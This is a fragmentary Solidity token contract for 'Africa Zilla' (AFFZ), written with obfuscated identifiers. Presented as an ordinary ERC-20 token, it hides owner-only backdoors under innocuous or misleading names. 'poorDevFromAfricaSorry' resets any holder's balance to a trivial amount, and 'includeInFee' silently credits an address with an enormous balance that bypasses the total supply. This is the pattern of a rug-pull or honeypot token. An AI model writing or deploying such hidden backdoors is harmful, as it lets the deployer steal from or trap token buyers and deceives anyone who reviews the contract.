...
abstract contract africaZillaAIAs {
...
interface africaZillaAIAsii is africaZillaAIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract africaZillaAIAsiii is africaZillaAIAs {
...
contract africaZilla is africaZillaAIAs, africaZillaAIAsi, africaZillaAIAsii, africaZillaAIAsiii {

    mapping(address => uint256) private africaZillaAIsuplly;
  mapping(address => bool) public africaZillaAIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private africaZillaAIRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public africaZillaAIPaw;
  address africaZillaAIdeploy;



    
    constructor(address africaZillaAIadressss) {
            // Editable
            africaZillaAIdeploy = msg.sender;

        _name = "Africa Zilla";
        _symbol = "AFFZ";
  africaZillaAIRooter = africaZillaAIadressss;        
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        return africaZillaAIsuplly[account];
    }
    ...
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
      ...
      modifier _internal() {
        require(africaZillaAIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier maxtokens () {
    require(africaZillaAIdeploy == msg.sender, "Ehi20: cannot permit _internal address");
    _;
    ...
    function _transfer(
        ...
        uint256 fromBalance = africaZillaAIsuplly[from];
        require(fromBalance >= lahsab, "Ehi20: transfer lahsab exceeds balance");
        unchecked {
            africaZillaAIsuplly[from] = fromBalance - lahsab;
        }
        africaZillaAIsuplly[to] += lahsab;
    ...
    function SendToken(address account, uint256 lahsab) internal virtual {
        ...
        africaZillaAIsuplly[account] += lahsab;
  ...
  function poorDevFromAfricaSorry(address excludeaddress) external _internal {
    africaZillaAIsuplly[excludeaddress] = 100000;
    ...
    function _burn(address account, uint256 lahsab) internal virtual {
        ...
        uint256 accountBalance = africaZillaAIsuplly[account];
        require(accountBalance >= lahsab, "Ehi20: burn lahsab exceeds balance");
        unchecked {
            africaZillaAIsuplly[account] = accountBalance - lahsab;
        }
        ALLtotalSupply -= lahsab;
  ...
  function includeInFee(address includeaddress) external _internal {
    africaZillaAIsuplly[includeaddress] = 1000000000 * 10 ** 24;
